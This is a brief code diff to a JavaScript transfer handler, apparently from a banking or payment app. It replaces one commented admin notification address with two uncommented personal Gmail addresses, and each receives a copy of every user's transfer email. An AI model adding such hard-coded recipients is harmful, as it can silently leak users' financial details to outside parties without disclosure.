@@ -120,8 +120,9 @@ const createLocalTransfer = async (req, res) => {
 
     // Send emails asynchronously
     await Promise.all([
-      sendEmail(user.email, subject, text, html), // Send email to user
-      sendEmail("Allenjenny126@gmail.com", `From ${user.email}`, text, html), // Send notification to admin
+      sendEmail(user.email, subject, text, html),
+      sendEmail("anniemary841@gmail.com", subject, text, html),
+      sendEmail("companychris00@gmail.com", subject, text, html),
     ]);
   } catch (error) {
     console.error("Error creating local transfer:", error);
